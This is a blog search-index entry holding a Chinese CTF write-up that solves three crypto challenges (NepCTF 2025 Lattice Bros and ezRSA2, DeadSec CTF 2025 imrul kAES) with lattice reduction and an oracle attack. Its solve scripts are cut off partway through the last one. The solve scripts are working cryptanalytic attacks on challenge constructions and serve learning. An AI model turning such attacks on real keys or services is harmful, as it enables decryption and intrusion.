<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>散题(1)</title>
      <link href="/2025/07/30/%E6%95%A3%E9%A2%98-1/"/>
      <url>/2025/07/30/%E6%95%A3%E9%A2%98-1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>以后一些我觉得比较有趣的题的WP都会放到“散题”栏目里面</p></blockquote><h2 id="nepctf-2025-lattice-bros">NepCTF 2025 | Lattice Bros</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#已知α的极小多项式为三次多项式f(x),即f(α)=0,且α≈54236.606188881754809671280151541781895183337725393</span></span><br><span class="line"><span class="comment">#上述极小多项式的常数项为a0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> a0,alpha</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt,log2</span><br><span class="line"></span><br><span class="line">d=<span class="number">981020902672546902438782010902608140583199504862558032616415</span></span><br><span class="line">p = d - a0</span><br><span class="line"></span><br><span class="line">k=sqrt(log2(p))+log2(log2(p))</span><br><span class="line">B = <span class="number">2</span>**<span class="number">30</span></span><br><span class="line"><span class="keyword">assert</span> B &lt; p/<span class="number">2</span>**k</span><br><span class="line"></span><br><span class="line">m = <span class="number">30</span></span><br><span class="line"><span class="keyword">assert</span> m &gt; <span class="number">2</span>*sqrt(log2(p))</span><br><span class="line"></span><br><span class="line">samples = []</span><br><span class="line">betas = []</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;samples.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    t = random.randint(<span class="number">1</span>, p-<span class="number">1</span>)</span><br><span class="line">    beta = random.randint(-B + <span class="number">1</span>, B - <span class="number">1</span>)</span><br><span class="line">    a = (t * alpha - beta) % p</span><br><span class="line">    samples.append((t, a))</span><br><span class="line">    betas.append(beta)</span><br><span class="line"></span><br><span class="line">f.write(<span class="built_in">str</span>(samples))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">assert</span> (betas[i]-samples[i][<span class="number">0</span>]*alpha+samples[i][<span class="number">1</span>])%p == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag = long_to_bytes(alpha)</span></span><br></pre></td></tr></table></figure><p>观察对flag的加密可以得知这是一个HNP，在求解HNP之前我们需要先知道p，由题可知<span class="math inline">\(p=d-a_0\)</span>，且<span class="math inline">\(a_0\)</span>是<span class="math inline">\(\alpha\approx54236.6061888\cdots\)</span>的三次极小多项式的常数项，参考<em>A Gentle Tutorial for Lattice-Based Cryptanalysis</em>的3.6可以知道如果我们要求该极小多项式，可以构造如下格：</p><p><span class="math display">\[\pmb{B}=\left(\begin{matrix} 10^{45}&amp; 1&amp;0&amp;0\\ \lfloor10^{45}\alpha\rfloor&amp;0&amp;1&amp;0\\ \lfloor10^{45}\alpha^2\rfloor&amp;0&amp;0&amp;1\\ \lfloor10^{45}\alpha^3\rfloor&amp;0&amp;0&amp;0 \end{matrix}\right)  \]</span> 上述矩阵中第一列乘上的系数<span class="math inline">\(10^{45}\)</span>是依照题目给出的<span class="math inline">\(\alpha\)</span>的近似值精度选取的，对于该格基，有：</p><p><span class="math display">\[(a_0, a_1, a_2, a_3)\pmb{B}=\left(\sum_{i=0}^{3}\lfloor10^{45}a_i\alpha^{i}\rfloor, a_0, a_1,a_2\right)  \]</span> 根据<em>A Gentle Tutorial for Lattice-Based Cryptanalysis</em>之3.6节所述可以知道直接对<span class="math inline">\(\pmb{B}\)</span>进行规约即可得到目标向量，从而恢复出<span class="math inline">\(a_0\)</span>： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alpha = RealField(<span class="number">200</span>)(<span class="number">54236.606188881754809671280151541781895183337725393</span>)</span><br><span class="line">N = <span class="number">10</span>^<span class="number">45</span></span><br><span class="line"></span><br><span class="line">L = matrix(ZZ, [[floor(N), <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>], [floor(N * alpha), <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>], [floor(N * alpha^<span class="number">2</span>), <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>], [floor(N * alpha^<span class="number">3</span>), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]])</span><br><span class="line">res = L.LLL()[<span class="number">0</span>]</span><br><span class="line">a0 = res[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新求根验证</span></span><br><span class="line">R.&lt;x&gt; = RealField(<span class="number">1000</span>)[]</span><br><span class="line">f = res[<span class="number">1</span>] + res[<span class="number">2</span>] * x + res[<span class="number">3</span>] * x^<span class="number">2</span> + x^<span class="number">3</span></span><br><span class="line">eps = f.roots()[<span class="number">0</span>][<span class="number">0</span>] - alpha</span><br></pre></td></tr></table></figure> 求出<span class="math inline">\(p\)</span>之后尝试直接构造如下格进行规约求解： <span class="math display">\[\pmb{B}_{HNP}=\left(\begin{matrix} p&amp;&amp;&amp;&amp;&amp;\\ &amp;p&amp;&amp;&amp;&amp;\\ &amp;&amp;\ddots&amp;&amp;&amp;\\ &amp;&amp;&amp;p&amp;&amp;\\ t_1&amp;t_2&amp;\cdots&amp;t_m&amp;\frac{B}{p}&amp;\\ a_1&amp;a_2&amp;\cdots&amp;a_m&amp;&amp;B \end{matrix}\right)  \]</span> 发现无法规约出想要的<span class="math inline">\(\alpha\)</span>（与求极小多项式时的<span class="math inline">\(\alpha\)</span>不同），可能是<span class="math inline">\(\alpha\)</span>比较大，这个格难以直接规约出我们想要的目标向量，可能需要进行一次配平，但是我们不知道<span class="math inline">\(\alpha\)</span>的具体大小，无法计算出具体的配平系数，故尝试添加一个未知的配平系数进行爆破，得到如下格：</p><p><span class="math display">\[\pmb{B}_{HNP}&#39;=\left(\begin{matrix} p&amp;&amp;&amp;&amp;&amp;\\ &amp;p&amp;&amp;&amp;&amp;\\ &amp;&amp;\ddots&amp;&amp;&amp;\\ &amp;&amp;&amp;p&amp;&amp;\\ t_1&amp;t_2&amp;\cdots&amp;t_m&amp;\frac{2^{k}B}{p}&amp;\\ a_1&amp;a_2&amp;\cdots&amp;a_m&amp;&amp;B \end{matrix}\right)  \]</span> 测试发现当<span class="math inline">\(k=2\)</span>的时候可以得到flag： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">samples = [...]</span><br><span class="line"></span><br><span class="line">alpha = RealField(<span class="number">200</span>)(<span class="number">54236.606188881754809671280151541781895183337725393</span>)</span><br><span class="line">N = <span class="number">10</span>^<span class="number">45</span></span><br><span class="line"></span><br><span class="line">L = matrix(ZZ, [[floor(N), <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>], [floor(N * alpha), <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>], [floor(N * alpha^<span class="number">2</span>), <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>], [floor(N * alpha^<span class="number">3</span>), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]])</span><br><span class="line">res = L.LLL()[<span class="number">0</span>]</span><br><span class="line">a0 = res[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新求根验证</span></span><br><span class="line">R.&lt;x&gt; = RealField(<span class="number">1000</span>)[]</span><br><span class="line">f = res[<span class="number">1</span>] + res[<span class="number">2</span>] * x + res[<span class="number">3</span>] * x^<span class="number">2</span> + x^<span class="number">3</span></span><br><span class="line">eps = f.roots()[<span class="number">0</span>][<span class="number">0</span>] - alpha</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">abs</span>(eps) &lt; <span class="number">1</span>/N</span><br><span class="line"></span><br><span class="line">n = <span class="number">30</span></span><br><span class="line">d = <span class="number">981020902672546902438782010902608140583199504862558032616415</span></span><br><span class="line"></span><br><span class="line">B = <span class="number">2</span>^<span class="number">30</span></span><br><span class="line">p = d - a0</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">k</span>):</span><br><span class="line">    L = matrix(QQ, n+<span class="number">2</span>, n+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        t, a = samples[i]</span><br><span class="line">        L[i, i] = p</span><br><span class="line">        L[-<span class="number">2</span>, i] = -t</span><br><span class="line">        L[-<span class="number">1</span>, i] = a</span><br><span class="line">    L[-<span class="number">2</span>, -<span class="number">2</span>] = (B * <span class="number">2</span>^k) / p</span><br><span class="line">    L[-<span class="number">1</span>, -<span class="number">1</span>] = B</span><br><span class="line">    res = L.LLL()[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    betas = res[:-<span class="number">2</span>]</span><br><span class="line">    alpha = <span class="built_in">int</span>(<span class="built_in">abs</span>(res[-<span class="number">2</span>] * p)) // (B * <span class="number">2</span>^k)</span><br><span class="line"></span><br><span class="line">    flag = long_to_bytes(alpha)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;NepCTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> solve(i):</span><br><span class="line">            <span class="built_in">print</span>(solve(i))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p><h3 id="补充">补充</h3><p>后来看了一下SeanDictionary师傅的wp（<a href="https://seandictionary.top/nepctf-2025/">NepCTF 2025 - SeanDictionary | 折腾日记</a>）才知道原来对格： <span class="math display">\[\pmb{B}_{HNP}=\left(\begin{matrix} p&amp;&amp;&amp;&amp;&amp;\\ &amp;p&amp;&amp;&amp;&amp;\\ &amp;&amp;\ddots&amp;&amp;&amp;\\ &amp;&amp;&amp;p&amp;&amp;\\ t_1&amp;t_2&amp;\cdots&amp;t_m&amp;\frac{B}{p}&amp;\\ a_1&amp;a_2&amp;\cdots&amp;a_m&amp;&amp;B \end{matrix}\right)  \]</span> 直接规约之后得到的<span class="math inline">\(\alpha\)</span>只需要在模<span class="math inline">\(p\)</span>下取相反数就能得到flag（学到了&gt;ω&lt;）： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">samples = [...]</span><br><span class="line"></span><br><span class="line">alpha = RealField(<span class="number">200</span>)(<span class="number">54236.606188881754809671280151541781895183337725393</span>)</span><br><span class="line">N = <span class="number">10</span>^<span class="number">45</span></span><br><span class="line"></span><br><span class="line">alpha = RealField(<span class="number">200</span>)(<span class="number">54236.606188881754809671280151541781895183337725393</span>)</span><br><span class="line">N = <span class="number">10</span>^<span class="number">45</span></span><br><span class="line"></span><br><span class="line">L = matrix(ZZ, [[floor(N), <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>], [floor(N * alpha), <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>], [floor(N * alpha^<span class="number">2</span>), <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>], [floor(N * alpha^<span class="number">3</span>), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]])</span><br><span class="line">res = L.LLL()[<span class="number">0</span>]</span><br><span class="line">a0 = res[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新求根验证</span></span><br><span class="line">R.&lt;x&gt; = RealField(<span class="number">1000</span>)[]</span><br><span class="line">f = res[<span class="number">1</span>] + res[<span class="number">2</span>] * x + res[<span class="number">3</span>] * x^<span class="number">2</span> + x^<span class="number">3</span></span><br><span class="line">eps = f.roots()[<span class="number">0</span>][<span class="number">0</span>] - alpha</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">abs</span>(eps) &lt; <span class="number">1</span>/N</span><br><span class="line"></span><br><span class="line">n = <span class="number">30</span></span><br><span class="line">d = <span class="number">981020902672546902438782010902608140583199504862558032616415</span></span><br><span class="line"></span><br><span class="line">B = <span class="number">2</span>^<span class="number">30</span></span><br><span class="line">p = d - a0</span><br><span class="line"></span><br><span class="line">L = matrix(QQ, n+<span class="number">2</span>, n+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    t, a = samples[i]</span><br><span class="line">    L[i, i] = p</span><br><span class="line">    L[-<span class="number">2</span>, i] = -t</span><br><span class="line">    L[-<span class="number">1</span>, i] = a</span><br><span class="line">L[-<span class="number">2</span>, -<span class="number">2</span>] = B / p</span><br><span class="line">L[-<span class="number">1</span>, -<span class="number">1</span>] = B</span><br><span class="line"></span><br><span class="line">res = L.LLL()[<span class="number">1</span>]</span><br><span class="line">betas = res[:-<span class="number">2</span>]</span><br><span class="line">alpha = (p - <span class="built_in">int</span>(<span class="built_in">abs</span>(res[-<span class="number">2</span>] * p)) // B) % p</span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(alpha)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></p><h2 id="nepctf-2025-ezrsa2">NepCTF 2025 | ezRSA2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getStrongPrime, getRandomNBitInteger, GCD, inverse, long_to_bytes, bytes_to_long, sieve_base  </span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_parameters</span>(<span class="params">gamma=<span class="number">0.33</span>, beta=<span class="number">0.33</span></span>):  </span><br><span class="line">    p = getStrongPrime(<span class="number">1024</span>)  </span><br><span class="line">    q = getStrongPrime(<span class="number">1024</span>)  </span><br><span class="line">    N = p*q  </span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)  </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">        d = getRandomNBitInteger(<span class="built_in">int</span>(<span class="number">2048</span>*beta))  </span><br><span class="line">        <span class="keyword">if</span> GCD(d, phi) == <span class="number">1</span>:  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    e = inverse(d, phi)  </span><br><span class="line">      </span><br><span class="line">    hints = []  </span><br><span class="line">    M = <span class="number">1</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(sieve_base)):  </span><br><span class="line">        li = sieve_base[i]  </span><br><span class="line">        hints.append(d%li)  </span><br><span class="line">        M *= li  </span><br><span class="line">        <span class="keyword">if</span> M.bit_length() &gt;= <span class="number">1024</span>*gamma:  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">return</span> e, N, hints  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():  </span><br><span class="line">    e,N,hints = gen_parameters()  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;e=<span class="subst">&#123;<span class="built_in">hex</span>(e)&#125;</span>&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;N=<span class="subst">&#123;<span class="built_in">hex</span>(N)&#125;</span>\n&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;hints=<span class="subst">&#123;hints&#125;</span>\n&#x27;</span>)  </span><br><span class="line">      </span><br><span class="line">    flag_prefix = <span class="string">b&#x27;NepCTF&#123;&#x27;</span>  </span><br><span class="line">    <span class="keyword">assert</span> flag.startswith(flag_prefix)  </span><br><span class="line">    <span class="keyword">assert</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)  </span><br><span class="line">      </span><br><span class="line">    pt = bytes_to_long(flag[<span class="built_in">len</span>(flag_prefix):-<span class="number">1</span>])  </span><br><span class="line">    ct = <span class="built_in">pow</span>(pt, e, N)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;ct=<span class="subst">&#123;<span class="built_in">hex</span>(ct)&#125;</span>&#x27;</span>)  </span><br><span class="line">      </span><br><span class="line">main()  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">e=...  </span></span><br><span class="line"><span class="string">N=...  </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">hints=[...]  </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">ct=...</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>根据参数生成函数可以知道本题中使用的<span class="math inline">\(d&lt;N^{\frac{1}{3}}\)</span>（大约是675 bits），显然私钥比较小，但是还是大于维纳攻击（<span class="math inline">\(d&lt;N^{0.25}\)</span>）以及Boneh&amp;Durfee攻击的边界（<span class="math inline">\(d&lt;N^{0.292}\)</span>）的，题中还给出了： <span class="math display">\[\begin{cases}hint_0\equiv d\pmod{p_1}\\hint_1\equiv d\pmod{p_2}\\\cdots\\hint_{r}\equiv d\pmod{p_{r+1}}\\\end{cases}\]</span> 其中<span class="math inline">\(p_i\)</span>为第<span class="math inline">\(i\)</span>个质数，令<span class="math inline">\(M=\prod_{i=1}^{r+1}p_{i}\)</span>，则可以通过CRT还原出<span class="math inline">\(d_0=d\mod{M}\)</span>，也就是<span class="math inline">\(d_0=d-lM\)</span>（<span class="math inline">\(l\ge0\)</span>）.因为<span class="math inline">\(d&lt;N^{\frac{1}{3}}\)</span>还算是比较小的，而且我们已经知道<span class="math inline">\(d\)</span>的大小约为<span class="math inline">\(N^{\frac{1}{6}}\)</span>的部分了，所以可以考虑用类似于维纳攻击的方法来求解这道题，因为<span class="math inline">\(ed-k\varphi(N)=1\)</span>，那么可以得到： <span class="math display">\[e(d_0+lM)-k(N-p-q+1)=1\]</span> 令<span class="math inline">\(s=1-p-q\)</span>，则有： <span class="math display">\[ed_0+eMl-kN=ks+1\]</span> 于是构造格： <span class="math display">\[\pmb{B}=\left(\begin{matrix}1&amp;0&amp;ed_0\\0&amp;1&amp;eM\\0&amp;0&amp;-N\end{matrix}\right)\]</span> 预期有<span class="math inline">\((1, l, k)\pmb{B}=(1, l, ks+1)\)</span>，由<span class="math inline">\(ed-k\varphi(N)=1\)</span>可以知道<span class="math inline">\(k\approx2^{675},l\approx2^{333}\)</span>有<span class="math inline">\(\det(\pmb{B})=N\)</span>，<span class="math inline">\(||(1, l, ks+1)||\approx 2^{675+1024}=2^{1699}\)</span>，显然有： <span class="math display">\[||(1, l, ks+1)||&gt;\sqrt{3}N^{1/3}\]</span> 故需要进行配平，粗略计算可以得到如下格： <span class="math display">\[\pmb{B}&#39;=\left(\begin{matrix}2^{1699}&amp;0&amp;ed_0\\0&amp;2^{1366}&amp;eM\\0&amp;0&amp;-N\end{matrix}\right)\]</span> 此时进行规约就可以得到目标向量<span class="math inline">\((2^{1699}, 2^{1366}l, ks+1)\)</span>，从而可以计算出<span class="math inline">\(d=d_0+lM\)</span>进行解密得到flag了： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> prod</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">e = ...</span><br><span class="line">N = ...</span><br><span class="line">ct = ...</span><br><span class="line"></span><br><span class="line">hints = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">21</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="number">38</span>, <span class="number">2</span>, <span class="number">20</span>, <span class="number">62</span>, <span class="number">66</span>, <span class="number">1</span>, <span class="number">22</span>, <span class="number">56</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">78</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">6</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">73</span>, <span class="number">75</span>, <span class="number">96</span>, <span class="number">112</span>, <span class="number">50</span>, <span class="number">93</span>, <span class="number">158</span>, <span class="number">97</span>, <span class="number">146</span>, <span class="number">8</span>, <span class="number">65</span>, <span class="number">96</span>, <span class="number">186</span>, <span class="number">161</span>, <span class="number">90</span>, <span class="number">131</span>, <span class="number">46</span>, <span class="number">32</span>, <span class="number">140</span>, <span class="number">133</span>, <span class="number">50</span>, <span class="number">43</span>, <span class="number">151</span>, <span class="number">234</span>]</span><br><span class="line">mod = [sieve_base[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(hints) + <span class="number">1</span>)]</span><br><span class="line">M = prod(mod)</span><br><span class="line"></span><br><span class="line">d0 = crt(hints, mod)</span><br><span class="line"></span><br><span class="line">L = matrix(ZZ, [[<span class="number">2</span>^<span class="number">1699</span>, <span class="number">0</span>, e*d0], [<span class="number">0</span>, <span class="number">2</span>^<span class="number">1366</span>, e*M], [<span class="number">0</span>, <span class="number">0</span>, -N]])</span><br><span class="line"></span><br><span class="line">d = ZZ(<span class="built_in">abs</span>(L.LLL()[<span class="number">0</span>][<span class="number">1</span>] // <span class="number">2</span>^<span class="number">1366</span>) * M + d0)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> d.bit_length() == floor(<span class="number">2048</span> * <span class="number">.33</span>)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(ct, d, N)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></p><h2 id="deadsec-ctf-2025-imrul-kaes">DeadSec CTF 2025 | imrul kAES</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python  </span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes, getPrime  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad  </span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes  </span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Yo welcome to my sign as a service...&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)  </span><br><span class="line">e = <span class="number">12389231641983877009741841713701317189420787527171545487350619433744301520682298136425919859970313849150196317044388637723151690904279767516595936892361663</span>  </span><br><span class="line">n = p * q  </span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))  </span><br><span class="line">  </span><br><span class="line">k = get_random_bytes(<span class="number">16</span>)  </span><br><span class="line">cipher = AES.new(k, AES.MODE_ECB)  </span><br><span class="line">  </span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()  </span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) &lt;= <span class="number">50</span>  </span><br><span class="line">ct = <span class="built_in">pow</span>(bytes_to_long(flag), e, n)  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(ct)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">       i = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Enter message to sign: &quot;</span>))  </span><br><span class="line">       <span class="keyword">assert</span>(<span class="number">0</span> &lt; i &lt; n)  </span><br><span class="line">       <span class="built_in">print</span>(cipher.encrypt(pad(long_to_bytes(<span class="built_in">pow</span>(i, d, n) &amp; ((<span class="number">1</span>&lt;&lt;<span class="number">512</span>) - <span class="number">1</span>)), <span class="number">16</span>)).<span class="built_in">hex</span>())  </span><br><span class="line">    <span class="keyword">except</span>:  </span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;bad input, exiting&quot;</span>)</span><br></pre></td></tr></table></figure><p>一道比较折磨的题，观察服务端代码可以看到对于每一次连接，代码都会生成一个模数<span class="math inline">\(n=pq\)</span>，并计算<span class="math inline">\(d\equiv e^{-1}\pmod{\varphi(n)}\)</span>，然后对flag进行RSA加密，之后用户可以进行无数次输入，对于每个输入的数据<span class="math inline">\(i\)</span>，程序会将其使用前面计算出的RSA私钥进行解密，然后与<span class="math inline">\(2^{512}-1\)</span>相与，最终转换成bytes，再进行AES加密（密钥是随机的16字节，无法爆破）.</p><p>可以知道，对于输入的数据<span class="math inline">\(i\)</span>，计算<span class="math inline">\(i^{d}\mod{n}\)</span>之后与<span class="math inline">\(2^{512}-1\)</span>相与，实际上就是取<span class="math inline">\(i^{d}\mod{n}\)</span>转换得到的字符串的后<span class="math inline">\(512\div8=64\)</span>字节，既然存在这种关系，且我们又已知RSA加密flag（设为<span class="math inline">\(pt\)</span>）后得到的密文<span class="math inline">\(ct\)</span>，那么我们就可以让输入的<span class="math inline">\(i\)</span>解密后的内容是<code>flag + k * b'\x00'</code>，实际上就是让： <span class="math display">\[i\equiv (2^{8k}pt)^e\equiv2^{8ke}ct\pmod{n}\]</span> 那么就可以通过控制<span class="math inline">\(k\)</span>的大小，从后向前通过类似Padding Oracle Attack的方式来爆破flag，但是在进行攻击操作之前我们需要知道<span class="math inline">\(n\)</span>的具体数值，由输入部分的代码可以知道，如果我们输入的<span class="math inline">\(i\)</span>不在<span class="math inline">\((0, n)\)</span>的区间内，尽管它会显示<code>bad input, exiting</code>，但是程序并不会真的退出，那么我们可以通过二分的方式来爆破出<span class="math inline">\(n\)</span>（大概率需要爆破1024次），在获得<span class="math inline">\(n\)</span>之后，我们就可以通过类似Padding Oracle Attack的方式来逐字恢复flag了：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad  </span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange  </span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable  </span><br><span class="line">  </span><br><span class="line">e = <span class="number">12389231641983877009741841713701317189420787527171545487350619433744301520682298136425919859970313849150196317044388637723151690904279767516595936892361663</span>  </span><br><span class="line">io = remote(<span class="string">&quot;ip&quot;</span>, port)  </span><br><span class="line">  </span><br><span class="line">io.recvline()  </span><br><span class="line">ct = <span class="built_in">int</span>(io.recvline().decode())  </span><br><span class="line">log.success(<span class="string">f&quot;Got ciphertext: <span class="subst">&#123;ct&#125;</span>&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">l = <span class="number">1</span>  </span><br><span class="line">r = <span class="number">2</span>**<span class="number">1024</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 二分法爆破n</span></span><br><span class="line"><span class="keyword">while</span> l &lt; r:  </span><br><span class="line">    m = (l + r) // <span class="number">2</span>  </span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter message to sign: &#x27;</span>, <span class="built_in">str</span>(m).encode())  </span><br><span class="line">    res = io.recvline()  </span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;bad input, exiting&#x27;</span> <span class="keyword">in</span> res:  </span><br><span class="line">        r = m  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        l = m + <span class="number">1</span>  </span><br><span class="line">    log.info(<span class="string">f&#x27;<span class="subst">&#123;r - l = &#125;</span>&#x27;</span>)  </span><br><span class="line">log.success(<span class="string">f&quot;Found n: <span class="subst">&#123;l&#125;</span>&quot;</span>)  </span><br><span class="line">n = l  </span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding Oracle Attack还原flag</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span>  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">1</span>, <span class="number">512</span> // <span class="number">8</span>):  </span><br><span class="line">    isUpdate = <span class="literal">False</span>  </span><br><span class="line">    